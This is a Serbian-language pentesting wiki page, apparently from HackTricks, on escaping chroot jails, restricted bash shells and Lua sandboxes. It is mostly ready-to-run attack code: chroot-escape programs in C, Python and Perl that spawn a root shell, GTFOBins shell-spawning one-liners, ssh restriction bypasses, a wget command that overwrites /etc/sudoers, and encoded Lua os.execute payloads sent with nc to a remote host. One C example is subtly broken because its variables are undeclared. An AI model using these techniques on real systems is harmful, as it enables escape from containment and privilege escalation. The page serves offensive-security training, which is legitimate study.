# Izlazak iz jail-ova

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da biste proverili da li možete izvršiti bilo koji binary sa svojstvom "Shell"**

## Chroot escapes

Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): chroot mehanizam **nije namenjen zaštiti** od namernog manipulisanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne nasleđuju pravilno, a chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi izašli**.\
To obično znači da za izlazak morate biti root unutar chroot-a.

> [!TIP]
> **Alat** [**chw00t**](https://github.com/earthquake/chw00t) kreiran je za zloupotrebu sledećih scenarija i izlazak iz `chroot`.

### Root + CWD

> [!WARNING]
> Ako ste **root** unutar chroot-a, **možete izaći** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), pa ako kreirate folder i zatim **kreirate novi chroot** u tom novom folderu dok ste **izvan njega**, sada ćete biti **izvan novog chroot-a** i samim tim ćete se nalaziti u FS-u.
>
> Ovo se dešava zato što chroot obično NE menja vaš radni direktorijum u navedeni direktorijum, pa možete kreirati chroot, a da se ne nalazite u njemu.

Obično nećete pronaći `chroot` binary unutar chroot jail-a, ali možete **kompajlirati, upload-ovati i izvršiti** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ovo je slično prethodnom slučaju, ali u ovom slučaju **attacker čuva file descriptor trenutnog direktorijuma**, a zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **access** tom **FD-u** **izvan** chroot-a, pristupa mu i **escapes**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD može da se prosledi preko Unix Domain Sockets, zato:
>
> - Kreirajte child proces (fork)
> - Kreirajte UDS kako bi parent i child mogli da komuniciraju
> - Pokrenite chroot u child procesu, u drugom direktorijumu
> - U parent proc kreirajte FD direktorijuma koji se nalazi izvan novog chroot-a child proc-a
> - Prosledite taj FD child proc-u pomoću UDS-a
> - Child proces izvršava chdir ka tom FD-u i, pošto se nalazi izvan svog chroot-a, izaći će iz jail-a

### Root + Mount

> [!WARNING]
>
> - Mount-ujte root device (/) u direktorijum unutar chroot-a
> - Izvršite chroot u taj direktorijum
>
> Ovo je moguće u Linux-u

### Root + /proc

> [!WARNING]
>
> - Mount-ujte procfs u direktorijum unutar chroot-a (ako već nije)
> - Pronađite pid koji ima drugačiji root/cwd entry, kao što je: /proc/1/root
> - Izvršite chroot u taj entry

### Root(?) + Fork

> [!WARNING]
>
> - Kreirajte Fork (child proc) i izvršite chroot u drugi direktorijum dublje u FS-u, a zatim uradite CD u njega
> - Iz parent procesa premestite direktorijum u kojem se child proces nalazi u direktorijum pre chroot-a child procesa
> - Ovaj child proces će se naći izvan chroot-a

### ptrace

> [!WARNING]
>
> - Ranije su korisnici mogli da debug-uju sopstvene procese iz procesa koji im pripadaju... ali to više nije podrazumevano moguće
> - U svakom slučaju, ako je to moguće, mogli biste da koristite ptrace nad procesom i izvršite shellcode unutar njega ([pogledajte ovaj primer](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeracija

Prikupite informacije o jail-u:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Izmena PATH-a

Proverite da li možete da izmenite PATH env varijablu
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim-a
```bash
:set shell=/bin/sh
:shell
```
### Pageri i help viewer-i

Mnoga ograničena okruženja i dalje ostavljaju **pagere** ili **help viewere** dostupnim. Njih je obično brže zloupotrebiti nego pokušavati ponovo izgraditi `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ako je `git` dostupan, imajte na umu da njegov izlaz pomoći obično prolazi kroz pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Уобичајени GTFOBins one-liners

Када утврдите до којих бинарних датотека можете да приступите, прво тестирајте очигледне shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ako možete samo da **ubrizgate argumente** u dozvoljenu komandu (umesto da je slobodno pokrenete), proverite i **GTFOArgs**.

### Kreiranje skripte

Proverite da li možete da kreirate izvršnu datoteku čiji je sadržaj _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Nabavite bash putem SSH-a

Ako pristupate putem ssh-a, često možete zatražiti od servera da izvrši **drugi program** umesto ograničene login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ako je `ssh` jedan od malobrojnih lokalno dozvoljenih binarnih fajlova, imajte na umu da se može zloupotrebiti i kao **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Deklariši
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete prepisati, na primer, sudoers fajl
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Neka okruženja vas ne uvode u običan `rbash`, već u **wrappers** kao što su `git-shell`, `rssh` ili `lshell`:

- `git-shell` prihvata samo Git komande na serverskoj strani, kao i sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da biste izlistali dozvoljene prilagođene radnje. Ako možete da **upisujete** u njega, svaki izvršni fajl koji ubacite u taj direktorijum postaje dostupan.
- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync` ili operacije u Git stilu. U tim slučajevima se prvo fokusirajte na **primitive za upisivanje fajlova**: otpremite `authorized_keys`, shell startup fajl ili pomoćnu skriptu na lokaciju u koju može da se upisuje, a zatim se ponovo povežite pomoću `ssh -t ...`.
- Ako wrapper samo filtrira komandnu liniju, izlistajte dostupne binarne fajlove, a zatim pređite na **GTFOBins / GTFOArgs**.

### Ostali trikovi

Takođe proverite:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Mogla bi biti zanimljiva i stranica:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Trikove za escaping iz Python jail-ova možete pronaći na sledećoj stranici:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval sa izvršavanjem komandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Nekoliko trikova za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Nabrojte funkcije biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Imajte na umu da se svaki put kada izvršite prethodni one liner u **drugačijem Lua okruženju redosled funkcija menja**. Zato, ako treba da izvršite određenu funkciju, možete izvršiti brute force attack tako što ćete učitati različita Lua okruženja i pozvati prvu funkciju le biblioteke:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijanje interaktivnog lua shell-a**: Ako se nalazite unutar ograničenog lua shell-a, možete dobiti novi lua shell (i nadamo se neograničen) pozivanjem:
```bash
debug.debug()
```
## Reference

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
